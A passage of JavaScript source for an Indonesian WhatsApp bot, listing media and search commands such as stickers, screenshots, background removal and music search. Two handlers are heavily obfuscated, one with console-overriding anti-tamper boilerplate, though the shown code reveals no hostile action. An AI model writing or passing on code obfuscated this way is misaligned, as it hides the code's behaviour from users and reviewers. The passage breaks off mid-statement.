_0x2365=function(_0xe2d543,_0x23653f){_0xe2d543=_0xe2d543-(-0x1e4b+0x1024+-0x2*-0x7f1);let _0x516690=_0xbcd25c[_0xe2d543];return _0x516690;},_0x2365(_0x214928,_0x1df37a);}const _0x359f2e={};_0x359f2e[_0x58d0c1(0x116,0x13c,0xfb,0x121)]=_0x58d0c1(0xf6,0x132,0x138,0x10a),_0x359f2e[_0x58d0c1(0x123,0x12d,0x10c,0x111)]=_0x129c70(0x516,0x527,0x541,0x559),_0x359f2e['to']=_0x58d0c1(0xe7,0xa8,0xf3,0xfa);const _0x2bfe7c={};_0x2bfe7c['code']=_LinkINV;const _0x5aabb1={};_0x5aabb1[_0x129c70(0x588,0x5ba,0x57c,0x5b9)]=_0x58d0c1(0xf2,0xdf,0xd9,0xae),_0x5aabb1['attrs']=_0x2bfe7c;const _0x3bec01={};_0x3bec01[_0x129c70(0x56c,0x58b,0x57c,0x5b6)]='iq';function _0x129c70(_0x4348f8,_0x2c116d,_0x314088,_0x2809de){return _0x2365(_0x314088-0x341,_0x2c116d);}_0x3bec01['attrs']=_0x359f2e,_0x3bec01['content']=[_0x5aabb1],client[_0x129c70(0x57b,0x566,0x53e,0x53e)](_0x3bec01)[_0x58d0c1(0x10d,0xdd,0x131,0xe0)](async _0x355a67=>{const _0x5e5d1f={'OAoSM':function(_0x12d10c,_0x231416){return _0x12d10c(_0x231416);},'vZMoF':_0x552f06(0x36c,0x3bd,0x37a,0x3b6)+'ta','AMKbq':_0x552f06(0x32b,0x33d,0x344,0x34a)+_0x37c79b(-0x1fe,-0x1fa,-0x207,-0x1f1),'jvuyo':'undefined','Wzawe':function(_0x3022f1,_0x27e331){return _0x3022f1(_0x27e331);},'GdYuQ':function(_0x47755b,_0x891ae1){return _0x47755b*_0x891ae1;},'mAfTy':function(_0x43faf9,_0x5a2876){return _0x43faf9(_0x5a2876);},'ehUzE':_0x37c79b(-0x1f6,-0x234,-0x23a,-0x237)+_0x552f06(0x377,0x370,0x33d,0x2f9),'NImDN':function(_0x474362,_0x1763bb){return _0x474362!==_0x1763bb;},'KfJOV':'UYVnl','bEbia':function(_0x3a67d7,_0x29f80c){return _0x3a67d7+_0x29f80c;},'QiStU':_0x552f06(0x35e,0x363,0x334,0x2fb),'UkiRO':'https://te'+_0x552f06(0x37b,0x382,0x36d,0x37c)+_0x37c79b(-0x18d,-0x19b,-0x1a4,-0x17f)+_0x552f06(0x391,0x3a8,0x381,0x374)+_0x552f06(0x389,0x399,0x357,0x387)};console[_0x37c79b(-0x1e3,-0x1a8,-0x1de,-0x1bb)](_0x355a67['content'][-0x212e+0x121a+0x3c5*0x4]['content'][0x20fa+-0x2*0x8fc+-0xf02]);let _0x277786='•\x20*「\x20Group'+_0x552f06(0x3cc,0x390,0x391,0x36e)+'rmation」*\x0a'+'\x0a';function _0x37c79b(_0x46843f,_0x5484ed,_0x484a4a,_0x2ad22f){return _0x58d0c1(_0x46843f- -0x2a9,_0x5484ed,_0x484a4a-0x152,_0x2ad22f-0x105);}_0x277786+=_0x37c79b(-0x1c8,-0x206,-0x1d9,-0x1f3)+(_0x355a67['content'][0xa8d*-0x3+-0x1f*-0x1+-0x1*-0x1f88]['attrs']['id']?_0x355a67[_0x37c79b(-0x1fd,-0x203,-0x1c1,-0x20d)][-0x102b+-0xf34*0x2+0x2e93][_0x37c79b(-0x1dc,-0x1b7,-0x1bd,-0x1be)]['id']:'undefined')+'\x0a',_0x277786+=_0x552f06(0x395,0x39e,0x376,0x376)+':\x20'+(_0x355a67[_0x552f06(0x374,0x34a,0x32f,0x340)][-0x13f0+0x2*-0xdfa+-0x5*-0x994][_0x37c79b(-0x1dc,-0x1c5,-0x1c6,-0x1e8)][_0x37c79b(-0x1fa,-0x1cd,-0x210,-0x1d9)]?_0x355a67['content'][0xff*0x23+0x252d*-0x1+0x250][_0x552f06(0x35f,0x388,0x350,0x37f)][_0x552f06(0x354,0x309,0x332,0x373)]:_0x552f06(0x33c,0x381,0x35d,0x368))+'\x0a',_0x277786+=_0x552f06(0x3aa,0x35b,0x376,0x370)+'update\x20by\x20'+':\x20'+(_0x355a67[_0x37c79b(-0x1fd,-0x22c,-0x1de,-0x204)][-0x2*-0x113d+0x1582+-0x4*0xdff][_0x552f06(0x35e,0x366,0x350,0x332)][_0x552f06(0x3a5,0x395,0x3ab,0x389)]['split']('@')[-0x23ac+0x1c31*-0x1+0x3fdd]?'@'+_0x355a67['content'][0x1cf9+-0x2347+-0x10d*-0x6][_0x552f06(0x313,0x35c,0x350,0x313)][_0x37c79b(-0x181,-0x16f,-0x147,-0x1b8)]['split']('@')[-0x11*0xd4+-0x1*0x2381+-0x3*-0x1087]:_0x37c79b(-0x1cf,-0x1de,-0x1d6,-0x1c7))+'\x0a',_0x277786+=_0x37c79b(-0x1b6,-0x182,-0x1ba,-0x1dd)+_0x37c79b(-0x1c9,-0x1cf,-0x1d1,-0x1cf)+':\x20'+(_0x355a67[_0x37c79b(-0x1fd,-0x212,-0x20c,-0x23c)][-0x956+-0x1c71+0x25c7][_0x552f06(0x36e,0x351,0x350,0x389)][_0x37c79b(-0x1d6,-0x218,-0x1e8,-0x20c)]?_0x5e5d1f['OAoSM'](moment,_0x355a67['content'][-0x62*-0xc+0x269a*0x1+0x39*-0xc2][_0x37c79b(-0x1dc,-0x1ed,-0x21e,-0x19b)]['s_t']*(0x179+0x26e*-0x5+-0xe95*-0x1))['tz'](_0x5e5d1f[_0x37c79b(-0x189,-0x15d,-0x168,-0x1c8)])[_0x552f06(0x351,0x2fd,0x32a,0x36e)](_0x5e5d1f[_0x552f06(0x34c,0x37a,0x367,0x393)]):_0x5e5d1f[_0x552f06(0x37a,0x385,0x38f,0x3aa)])+'\x0a',_0x277786+=_0x552f06(0x32a,0x32b,0x34c,0x365)+_0x552f06(0x326,0x361,0x327,0x360)+(_0x355a67[_0x552f06(0x323,0x329,0x32f,0x36c)][0x21aa+-0x1058*0x1+-0x1152][_0x37c79b(-0x1dc,-0x1f6,-0x1d1,-0x210)]['creator']?'@'+_0x355a67[_0x552f06(0x301,0x2fc,0x32f,0x2fe)][-0x5*-0x7ae+-0x1d99+-0x8cd*0x1][_0x552f06(0x35e,0x35f,0x350,0x345)][_0x37c79b(-0x1dd,-0x1f2,-0x21d,-0x1c8)][_0x37c79b(-0x18c,-0x175,-0x166,-0x1bb)]('@')[0xe*0x1d5+0x813+-0x61*0x59]:_0x37c79b(-0x1cf,-0x1de,-0x1ec,-0x1bb))+'\x0a',_0x277786+=_0x552f06(0x338,0x34d,0x32d,0x31c)+_0x37c79b(-0x1b8,-0x182,-0x1bd,-0x185)+(_0x355a67['content'][0x60a+0xd0a+-0x1314]['attrs'][_0x552f06(0x378,0x33c,0x33b,0x321)]?_0x5e5d1f[_0x37c79b(-0x191,-0x179,-0x164,-0x1b1)](moment,_0x5e5d1f[_0x552f06(0x386,0x3a4,0x373,0x35a)](_0x355a67[_0x552f06(0x328,0x308,0x32f,0x305)][0x52f+0xde2+0x65b*-0x3][_0x37c79b(-0x1dc,-0x1ba,-0x19f,-0x1ba)][_0x552f06(0x31c,0x341,0x33b,0x31b)],0x1a23*0x1+-0x836+-0xe05))['tz'](_0x5e5d1f[_0x552f06(0x370,0x36d,0x3a3,0x388)])[_0x552f06(0x34f,0x323,0x32a,0x30a)](_0x5e5d1f['AMKbq']):_0x5e5d1f[_0x552f06(0x3ac,0x34d,0x38f,0x34a)])+'\x0a';function _0x552f06(_0x2fbffd,_0x3a32d5,_0x2ded1e,_0x28bc4a){return _0x129c70(_0x2fbffd-0x49,_0x28bc4a,_0x2ded1e- -0x1d5,_0x28bc4a-0x1a9);}_0x277786+=_0x37c79b(-0x1df,-0x1e5,-0x1b6,-0x21f)+_0x552f06(0x339,0x368,0x351,0x387)+(_0x355a67[_0x552f06(0x2f9,0x349,0x32f,0x366)][-0x129c+0x5*0x4a2+0x16*-0x35][_0x552f06(0x31a,0x38f,0x350,0x36b)]['size']?_0x355a67['content'][0x1962*0x1+0x1091+-0x29f3][_0x552f06(0x34a,0x33b,0x350,0x34b)][_0x552f06(0x36f,0x3a8,0x38a,0x34e)]:_0x5e5d1f[_0x37c79b(-0x19d,-0x17f,-0x1c3,-0x169)])+_0x552f06(0x3d7,0x3b9,0x3a8,0x380),_0x277786+=_0x37c79b(-0x192,-0x1a8,-0x1d0,-0x198)+_0x37c79b(-0x1e9,-0x222,-0x206,-0x1c1)+(_0x355a67[_0x37c79b(-0x1fd,-0x217,-0x1f5,-0x221)][-0xf86*0x1+-0x6e1*-0x5+0x12df*-0x1][_0x37c79b(-0x1fd,-0x238,-0x22b,-0x23a)][-0x130b*0x1+0x1a09+-0x6fe]['attrs'][_0x552f06(0x3b0,0x37a,0x37d,0x358)+'t']?'@'+_0x355a67[_0x552f06(0x35f,0x347,0x32f,0x368)][-0x19a2*-0x1+0x1c36+-0x35d8][_0x552f06(0x32e,0x30a,0x32f,0x35a)][0x172f*0x1+-0xda5+0x4a*-0x21][_0x37c79b(-0x1dc,-0x21f,-0x1f1,-0x1bb)]['participan'+'t']['split']('@')[-0x1f95+-0x101*-0x14+0xb81]:_0x5e5d1f['jvuyo'])+'\x0a',_0x277786+=_0x552f06(0x3ba,0x361,0x39a,0x388)+_0x37c79b(-0x1be,-0x19e,-0x1ad,-0x1de)+(_0x355a67['content'][-0x24e1+0x9df+0x1b02][_0x552f06(0x35c,0x325,0x32f,0x2ee)][-0x790+0x12a*-0x6+0xe8c]['attrs']['t']?_0x5e5d1f[_0x552f06(0x36a,0x3a7,0x386,0x357)](moment,_0x5e5d1f[_0x37c79b(-0x1b9,-0x1a1,-0x1ed,-0x1a1)](_0x355a67[_0x37c79b(-0x1fd,-0x200,-0x1d7,-0x1d7)][-0x26de+0xb1e+0x6f0*0x4][_0x552f06(0x309,0x2f2,0x32f,0x300)][0x77b*-0x5+0xfb2+0x15b5]['attrs']['t'],0x1*-0x147+0xeae*-0x2+-0x1*-0x228b))['tz']('Asia/Jakar'+'ta')[_0x37c79b(-0x202,-0x218,-0x1c7,-0x1fb)](_0x5e5d1f['AMKbq']):_0x5e5d1f['jvuyo'])+'\x0a',_0x277786+=_0x552f06(0x2f7,0x316,0x339,0x324)+':\x20'+(_0x355a67[_0x552f06(0x322,0x316,0x32f,0x364)][-0x12ed+-0x13da+0x26c7]['content'][-0x805+-0x1afa+0x22ff][_0x552f06(0x380,0x389,0x350,0x370)]['id']?_0x355a67['content'][-0xe05+-0x61*-0x38+-0x1*0x733][_0x37c79b(-0x1fd,-0x1ff,-0x22d,-0x1f4)][0x18b2+0x15c+-0x1a0e][_0x37c79b(-0x1dc,-0x1bf,-0x215,-0x1b9)][_0x552f06(0x323,0x35a,0x35c,0x34d)]:_0x5e5d1f[_0x552f06(0x3ca,0x375,0x38f,0x34e)])+'\x0a',_0x277786+='ℹ️\x20Descript'+_0x37c79b(-0x1e2,-0x19e,-0x1d5,-0x1ad)+(_0x355a67[_0x552f06(0x318,0x350,0x32f,0x341)][0x242c+-0x637+-0x1df5][_0x37c79b(-0x1fd,-0x1f2,-0x1d5,-0x1e5)][0x183a+-0x7*0x547+0xcb7][_0x37c79b(-0x1fd,-0x1cb,-0x1da,-0x241)]?_0x355a67['content'][-0x4*-0x3fb+0x493*0x1+-0x147f]['content'][0x249+0x155*-0x17+0x1c5a][_0x552f06(0x314,0x329,0x32f,0x30f)][-0xa3b+0x23*-0xb4+0x1*0x22d7][_0x37c79b(-0x1fd,-0x231,-0x1f1,-0x239)][_0x552f06(0x2f7,0x300,0x330,0x2fe)]():_0x5e5d1f[_0x37c79b(-0x1d3,-0x196,-0x1c0,-0x1a5)])+'\x0a';try{if(_0x5e5d1f[_0x552f06(0x397,0x39b,0x38d,0x392)](_0x37c79b(-0x1ac,-0x1aa,-0x1e4,-0x1b6),_0x5e5d1f[_0x552f06(0x378,0x314,0x355,0x352)]))ppgc=await client[_0x37c79b(-0x180,-0x167,-0x160,-0x1bf)+_0x37c79b(-0x17e,-0x186,-0x19d,-0x1be)](_0x5e5d1f[_0x552f06(0x374,0x31a,0x338,0x31f)](_0x355a67[_0x552f06(0x35b,0x30b,0x32f,0x36c)][-0x21*-0x25+0x259b+-0x710*0x6][_0x37c79b(-0x1dc,-0x21c,-0x19b,-0x1b1)]['id'],_0x552f06(0x36c,0x363,0x36a,0x33d)),_0x5e5d1f[_0x37c79b(-0x1aa,-0x1af,-0x1c8,-0x191)]);else{if(_0x1d0b61){const _0x2561ae=_0x5c3b40['apply'](_0x1d2982,arguments);return _0x3f6487=null,_0x2561ae;}}}catch{ppgc=_0x5e5d1f[_0x552f06(0x367,0x353,0x368,0x3a8)];}const _0xe96974={};_0xe96974[_0x37c79b(-0x18a,-0x19b,-0x18c,-0x164)]=ppgc;const _0x176e00={};_0x176e00['quoted']=msg[_0x37c79b(-0x1cd,-0x1a4,-0x188,-0x1a5)],await client[_0x37c79b(-0x19a,-0x1d8,-0x165,-0x1b5)+'e'](from,{'image':_0xe96974,'caption':_0x277786,'mentions':await client[_0x552f06(0x369,0x35b,0x331,0x335)+'on'](_0x277786)},_0x176e00);});
  }
  break
  // 
  case prefix+'stickerpin': case prefix+'pinstick': case prefix+'pintereststicker':{
   if (args.length < 1) return msg.reply('Cari gambar apa?')
     client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
     try{
   const pint = await pinterest(`${q}`)
     let xm_za = pint[Math.floor(Math.random() * pint.length)];
       console.log(xm_za)      
     let hek = await getBuffer(xm_za)
     let buffers = await writeExifImg(hek, { packname: SETTING.packname, author: SETTING.author })
       await client.sendMessage(from, { sticker: { url: buffers } }, { quoted: msg })
       } catch (e) { e = String(e)
      msg.reply('Tidak ditemukan!')
   }
  }
  break

  // 
  case prefix+"pp":{
  client.sendMessage(from, { history: "Anu" }, {quoted:msg})
  }
  break

    case prefix+'listsection1':{
  // send a list message!
   const sections = [
    {
	title: "Section",
	rows: [
	   {
	    title: "List1", 
	    rowId: "option"
	   },	    
     ]
    }    
    ]

  const listMessage = {
   text: "This is a list",
   footer: "This is footer text",
   title: "List message",
   buttonText: "Required, text on the button to view the list",
   sections
   }

  client.sendMessage(from, listMessage, {quoted:msg})


  }
  break
  //
  case prefix+'ssweb':{
   if (!q) return reply('Harap sertakan link!')
   client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
   client.sendMessage(from, { image: { url : 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q }, caption: `Result✔️`}, { quoted: msg } )
   }
  break
   //
   case prefix+'readqr':{
   if ((!isMedia && msg.isQuotedImage)  && args.length == 0) {
   let buffer = await client.downloadAndSaveMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
    var Jimp = require("jimp");
   Jimp.read(buffer, function(err, image) {
    if (err) {
        console.error(err);
        // TODO handle error
    }
    var qr = new QrCode();
    qr.callback = function(err, value) {
        if (err) {
            console.error(err);
            // TODO handle error
        }
        console.log(value.result);
       msg.reply(value.result)     
    };
    qr.decode(image.bitmap);
    });
   } else { msg.reply(`Reply gambar dengan caption ${prefix + command} \n`) }

   }
   break
   //
    case prefix+'upscaler':{
    if (!msg.isQuotedImage) return msg.reply('Reply gambarnya!')

     let media = await client.downloadAndSaveMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
      let tph = await TelegraPh(media)
     let anu = await imgSuper(tph)
     console.log(tph)
     console.log(anu)
     await client.sendMessage(from, { image: { url: anu.output_url }, caption:"Success✓!"}, { quoted: msg })
     
   }
   break

   case prefix+'removebg':{
   if (!msg.isQuotedImage) return msg.reply('Reply gambarnya!') 
     let media = await client.downloadMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
     let ranE = getRandom('.jpg')
       await fs.writeFileSync('./storage_cabinets/' + ranE, media)
     const _buff = './storage_cabinets/' + ranE
     let anu = await remove(fs.readFileSync(_buff))
     console.log(anu)
      	let ranJ = getRandom('.jpg')
        await fs.writeFileSync('./storage_cabinets/' + ranJ, anu)
        const buff = './storage_cabinets/' + ranJ        
          await client.sendMessage(from, { image: { url: buff }, caption:"Success✓!"}, { quoted: msg })
        setTimeout(() => { fs.unlinkSync(buff) }, 10000)
        setTimeout(() => { fs.unlinkSync(_buff) }, 10000)     
   }
   break
  case prefix+'poll':{
  client.poll('Tes',
     [ 
       {"optionName": "TES1" }, 
       { "optionName": "TES2" }, 
       { "optionName": "TES3" }, 
       { "optionName": "TES4" }, 
       { "optionName": "TES5" }
     ], 
      { userJid: from, quoted: msg.fpay })
   }
  break
           case prefix+'setthumb':{
                       if (!msg.key.fromMe && !isOwner) return msg.reply("Khusus owner!")
                       if (!msg.isQuotedImage) return msg.reply('Reply gambarnya!')
                                 let media = await client.downloadMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
                await fs.writeFileSync('./storage_cabinets/image/thumb.jpg', media)
               msg.reply('Success✓')
            }
          break
    case prefix+'gris':{
    if ((!isMedia && msg.isQuotedImage)  && args.length == 0) {
   let media = await client.downloadAndSaveMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
    let tph = await TelegraPh(media)    
  axios.get('https://node-reverse-image-search.herokuapp.com/?imageUrl=' + encodeURIComponent(tph))
  .then(async response => {
    let fresh = response.data
     let sections = []   
    for (let i = 0; i < fresh.length; i++) {    
    const list = {title: `${i + 1}. ${fresh[i].title}`,
     rows: [
	    {
	     title: "Link", 
	     rowId: `#ssweb ${fresh[i].url}`,
	     description: `Screnshoot from url ${fresh[i].url}`,
	    },
       ]
      }
     sections.push(list)  
     }      
    await client.sendMessage(from, { text: "Looking for images with similar image media", footer: SETTING.botname, title: "[ GOOGLE REVERSE IMAGE SEARCH ]", buttonText: "Click and see search results➡️", sections }, {quoted:msg})

  }) 
   } else { msg.reply(`Reply gambar dengan caption ${prefix + command} \n`) }

  }
  break
  //
  case prefix+'golens':{
     if ((!isMedia && msg.isQuotedImage)  && args.length == 0) {
   let media = await client.downloadAndSaveMediaMessage(msg.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
    let tph = await TelegraPh(media)
    let result = await goLens(tph)
      console.log(result)
       client.sendMessage(from, { image: { url : 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + result.url }, caption: `${result.url}`}, { quoted: msg } )
     } else { msg.reply(`Reply gambar dengan caption ${prefix + command} \n`) }
   }
  break
//
  case prefix+'waifu': case prefix+'megumin':
  case prefix+'shinobu':
  case prefix+'awoo': case prefix+'neko':{
   client.sendMessage(from, { react: { text: "⏱️", key: msg.key }})
    try{
     let za = await fetchJson(`https://waifu.pics/api/sfw/${command}`)  
     let buttons = [
      {
       buttonId: `#${command}`, 
       buttonText: {
        displayText: 'Next'
      }, type: 1},
     ]
    let buttonMessage = {
       image: { url: za.url },
       caption: "Result",
       footer: SETTING.botname,
       buttons: buttons,
       headerType: 4
       }
      await client.sendMessage(from, buttonMessage, { quoted: msg })
     } catch (e){ msg.reply("Maaf, sepertinya terjadi kesalahan dalam pengiriman gambar") }
    }
   break

  
  //
  case prefix+'play': case prefix+'lagu': case prefix+'musik':{//@rifza.p.p!!
    (function(_0x5d306d,_0x3a5303){function _0x5c065c(_0x12b31e,_0x5e15f8,_0x5d42e9,_0x214a6b){return _0x3038(_0x5d42e9-0xc6,_0x5e15f8);}const _0x17e7c8=_0x5d306d();function _0xc9c331(_0x186d49,_0x577936,_0x29ca02,_0x4da009){return _0x3038(_0x186d49-0x329,_0x577936);}while(!![]){try{const _0x479d19=parseInt(_0x5c065c(0x19c,0x1aa,0x1ba,0x1d6))/(0x30*0x1a+-0x995+-0x2*-0x25b)*(parseInt(_0xc9c331(0x412,0x407,0x40c,0x3fc))/(-0x1eb7+-0x1abd+0x3976*0x1))+-parseInt(_0xc9c331(0x415,0x436,0x439,0x438))/(-0x3*-0x2e7+-0x1*-0xf83+-0x1*0x1835)+parseInt(_0xc9c331(0x3e0,0x3da,0x3ef,0x3f9))/(-0x17a3+0x40f*-0x1+0x1bb6)+-parseInt(_0xc9c331(0x402,0x409,0x409,0x3ff))/(0x1ac+-0x1*-0xcdb+-0x26b*0x6)+-parseInt(_0xc9c331(0x419,0x403,0x428,0x416))/(-0x2*0xef2+0x1a32+0x3b8)*(-parseInt(_0x5c065c(0x18f,0x190,0x1a1,0x19d))/(0x1cba+0x3e*0x4+0x7*-0x43d))+parseInt(_0x5c065c(0x194,0x173,0x186,0x18e))/(-0x1ca*-0x13+0x1*-0x1f38+-0x2be)+-parseInt(_0xc9c331(0x3da,0x3f3,0x3fd,0x3fb))/(0x255c+-0x2496+-0xbd);if(_0x479d19===_0x3a5303)break;else _0x17e7c8['push'](_0x17e7c8['shift']());}catch(_0xd158ae){_0x17e7c8['push'](_0x17e7c8['shift']());}}}(_0x372d,0x148e99+0x61f0b*-0x3+0x897bc));function _0x372d(){const _0x39296f=['#youtubemp','descriptio','apply','rn\x20this\x22)(','4912460pgVKgy','table','join','YmhGk','length','text','YnUWb','#selegigct','Click\x20and\x20','8570472wwOkkU','search','\x0a\x0aℹ️Id\x20:\x20','sendMessag','nction()\x20','GZugE','ndkJh','quoted','llection\x20o','Music\x20Sear','ch🔎\x20]','toString','3/mp4✔️','\x0a\x0a🔎Source\x20','(((.+)+)+)','QuSwR','bXhGz','url','__proto__','title','Swouf','lagu\x20apa?','\x0a\x0a📊Duratio','footer','error','5348025ZZeqBv','omplete\x20co','605157DuKlkj','bind','constructo','push','duration','noKPo','botname','console','trace','{}.constru','sbIxL','\x0a\x0a📄\x20Descri','videoId','BUsuH','700qWEzhZ','n\x20:\x20','aqzpu','417957UtmJHC','return\x20(fu','exception','ctor(\x22retu','12ViwbpJ','info','f\x20songs\x20mp','log','1912eLluFC','all','typgffe\x20','[\x20▶️\x20]\x20VIDE','11031606GbeYtD','\x20results➡️'];_0x372d=function(){return _0x39296f;};return _0x372d();}const _0x55152a=(function(){function _0x315e8b(_0x1ca804,_0x39bef7,_0x199105,_0x26f0bf){return _0x3038(_0x1ca804-0x15f,_0x39bef7);}const _0x182f0e={};_0x182f0e['kcOMD']=function(_0x111920,_0x49a709){return _0x111920===_0x49a709;},_0x182f0e['FQdgb']=_0x315e8b(0x247,0x231,0x228,0x262);const _0x57d864=_0x182f0e;let _0x2fafc6=!![];return function(_0x573fbf,_0x636693){const _0x5465c6=_0x2fafc6?function(){function _0x5c3d7d(_0x22c8bd,_0x2ba44e,_0x2576ed,_0x181b37){return _0x3038(_0x2576ed- -0x19f,_0x181b37);}function _0x28ea55(_0xb6c580,_0x1ee3cf,_0x231d2a,_0x1cd077){return _0x3038(_0xb6c580-0x273,_0x1cd077);}if(_0x57d864['kcOMD'](_0x57d864['FQdgb'],_0x28ea55(0x35b,0x352,0x376,0x35c))){if(_0x636693){const _0x15c52c=_0x636693[_0x5c3d7d(-0xfd,-0xe3,-0xea,-0xfa)](_0x573fbf,arguments);return _0x636693=null,_0x15c52c;}}else _0x532bdf=_0x41d158;}:function(){};return _0x2fafc6=![],_0x5465c6;};}()),_0x6b987b=_0x55152a(this,function(){const _0x3bf1b3={};_0x3bf1b3[_0x16c55a(0x216,0x229,0x1fe,0x209)]=_0x16c55a(0x21e,0x23a,0x23e,0x222)+'+$';function _0x16c55a(_0x5cef3d,_0x2a76b0,_0x6e1894,_0x21d250){return _0x3038(_0x5cef3d-0x150,_0x6e1894);}const _0x53294a=_0x3bf1b3;function _0x1301ae(_0x1d8858,_0x2b0ad1,_0xca49c4,_0x2cb67e){return _0x3038(_0xca49c4-0x35d,_0x2cb67e);}return _0x6b987b[_0x16c55a(0x21b,0x21c,0x226,0x22a)]()['search'](_0x53294a['ndkJh'])[_0x1301ae(0x427,0x408,0x428,0x421)]()[_0x1301ae(0x421,0x42c,0x43a,0x430)+'r'](_0x6b987b)[_0x16c55a(0x211,0x22a,0x1fd,0x20f)](_0x16c55a(0x21e,0x23a,0x236,0x216)+'+$');});_0x6b987b();const _0x4d21b3=(function(){let _0x1f3fe3=!![];return function(_0x46eb58,_0x53c08e){const _0x1a2197=_0x1f3fe3?function(){function _0x13ba52(_0x63b7da,_0x3fdce4,_0x62c7d3,_0x56e474){return _0x3038(_0x62c7d3- -0x1db,_0x63b7da);}if(_0x53c08e){const _0xac11ce=_0x53c08e[_0x13ba52(-0x10a,-0x108,-0x126,-0x122)](_0x46eb58,arguments);return _0x53c08e=null,_0xac11ce;}}:function(){};return _0x1f3fe3=![],_0x1a2197;};}()),_0x2e8953=_0x4d21b3(this,function(){const _0x2d2b27={'aqzpu':function(_0x10cf97,_0x29c511){return _0x10cf97(_0x29c511);},'NHCru':function(_0x3e6858,_0x44a7e0){return _0x3e6858+_0x44a7e0;},'bXhGz':function(_0x5cf9ca,_0x30e3a1){return _0x5cf9ca+_0x30e3a1;},'YnUWb':_0x44c175(0x1c3,0x1ae,0x1be,0x1c0)+_0x44c175(0x1eb,0x1e3,0x1c9,0x1a8)+_0xc19464(0x31d,0x33e,0x33e,0x33d)+'\x20)','YmhGk':function(_0x14a7f8){return _0x14a7f8();},'Swouf':_0xc19464(0x387,0x35d,0x37b,0x366),'rEJQN':'warn','noKPo':_0xc19464(0x37d,0x394,0x379,0x396),'QuSwR':_0xc19464(0x34b,0x37d,0x360,0x349),'REjUh':_0x44c175(0x1bd,0x1ae,0x1c8,0x1de),'sbIxL':_0xc19464(0x341,0x363,0x340,0x356),'ExXiq':_0xc19464(0x385,0x37b,0x36b,0x35a),'GZugE':function(_0xfd0f2c,_0x3958c7){return _0xfd0f2c<_0x3958c7;}};function _0xc19464(_0x1a29f9,_0x202c73,_0x4b1b4d,_0x1b63a1){return _0x3038(_0x4b1b4d-0x288,_0x1a29f9);}let _0x2c0272;try{const _0x11aa9c=_0x2d2b27[_0x44c175(0x1d4,0x1c5,0x1c5,0x1bc)](Function,_0x2d2b27['NHCru'](_0x2d2b27[_0x44c175(0x1a6,0x1b8,0x1aa,0x18f)](_0xc19464(0x35b,0x37f,0x375,0x396)+_0xc19464(0x33f,0x35c,0x34c,0x32a),_0x2d2b27[_0x44c175(0x182,0x19e,0x197,0x1b9)]),');'));_0x2c0272=_0x2d2b27[_0x44c175(0x189,0x1ab,0x194,0x1ad)](_0x11aa9c);}catch(_0x82fa01){_0x2c0272=window;}const _0x4427cb=_0x2c0272[_0x44c175(0x1b1,0x1d5,0x1bc,0x1bf)]=_0x2c0272[_0xc19464(0x361,0x37a,0x36a,0x347)]||{};function _0x44c175(_0x4b63b1,_0x1e634f,_0x36e82e,_0x4e8311){return _0x3038(_0x36e82e-0xda,_0x4b63b1);}const _0x37a380=[_0x2d2b27[_0x44c175(0x194,0x1ce,0x1ae,0x1ad)],_0x2d2b27['rEJQN'],_0x2d2b27[_0xc19464(0x374,0x380,0x368,0x389)],_0x2d2b27[_0x44c175(0x1a0,0x195,0x1a9,0x18f)],_0x2d2b27['REjUh'],_0x2d2b27[_0x44c175(0x1d7,0x19f,0x1bf,0x1bf)],_0x2d2b27['ExXiq']];for(let _0x23a5b5=-0xaf+-0x4a7+-0x1*-0x556;_0x2d2b27[_0x44c175(0x17d,0x1b7,0x19f,0x1a2)](_0x23a5b5,_0x37a380[_0x44c175(0x172,0x1af,0x195,0x188)]);_0x23a5b5++){const _0x6ea2=_0x4d21b3['constructo'+'r']['prototype'][_0xc19464(0x36b,0x346,0x364,0x36f)](_0x4d21b3),_0x1562df=_0x37a380[_0x23a5b5],_0xabdd5a=_0x4427cb[_0x1562df]||_0x6ea2;_0x6ea2[_0xc19464(0x368,0x349,0x35a,0x374)]=_0x4d21b3[_0x44c175(0x1c6,0x1c6,0x1b6,0x1d4)](_0x4d21b3),_0x6ea2[_0xc19464(0x346,0x35a,0x353,0x362)]=_0xabdd5a[_0x44c175(0x1bc,0x1bf,0x1a5,0x1a9)][_0x44c175(0x1ac,0x1c3,0x1b6,0x1ce)](_0xabdd5a),_0x4427cb[_0x1562df]=_0x6ea2;}});_0x2e8953();if(args['length']<-0x702+-0x1bf*-0x6+0x377*-0x1)return msg['reply'](_0x4b8edf(-0x16b,-0x15b,-0x183,-0x15c));const fresh_=await ytsr[_0x2f2bc6(0x4e,0x34,0x31,0x3a)](args[_0x4b8edf(-0x187,-0x1a4,-0x188,-0x168)]('\x20')),fresh=fresh_[_0x4b8edf(-0x14b,-0x131,-0x13c,-0x157)];console[_0x2f2bc6(0x60,0x51,0x7a,0x6c)](fresh);let sections=[];for(let i=0x1477+0xc0*0xe+-0x1ef7;i<fresh[_0x2f2bc6(0x1a,0x32,0x2e,0x34)];i++){const 